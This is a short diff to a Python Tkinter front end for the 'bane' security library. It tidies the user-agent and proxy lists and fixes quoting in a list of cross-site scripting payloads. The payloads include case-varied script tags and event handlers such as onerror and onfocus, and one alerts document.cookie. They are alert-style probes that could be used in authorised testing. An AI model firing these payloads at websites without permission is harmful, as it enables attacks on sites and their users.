@@ -78,23 +78,22 @@ Label(main, text = "Crawl",background='light sky blue').grid(row=8)
 Label(main, text = "",background='light sky blue').grid(row=9)
 Label(main, text = "",background='light sky blue').grid(row=10)
 
-ua=[
-"",
+ua=[""]
+ua+=bane.ua
+pl=[
+ '',
 "<a onmouseover=alert(123)>Hey there</a>",
 "<a oNmOusEoVeR=alert(123)>Hey there</a>",
 "<sCRipt>alert(123)</sCRipt>",
 "<sCRipt>alert(document.cookie)</sCRipt>",
-"<button onclick="alert(123)">Click me</button>",
+'<button onclick="alert(123)">Click me</button>',
 '<input type="text" onkeypress="alert(123)">',
 '<input type="text" onfocus="alert(123)">',
 '<inPuT type="text" onfocus="alert(123)">',
-'<img src=xss.png onerror=alert('Boom!')>',
-'<img src=xss.png OnerRor=alert('Boom!')>',
-'<ImG src=xss.png OnerRor=alert('Boom!')>'
+'<img src=xss.png onerror=alert(123)>',
+'<img src=xss.png OnerRor=alert(123)>',
+'<ImG src=xss.png OnerRor=alert(123)>'
    ]
-ua+=bane.ua
-li=bane.read_file('xss.txt')
-pl=['']
 pl+=bane.xsspayloads
 prox=[""]
 prox+=bane.http(200)
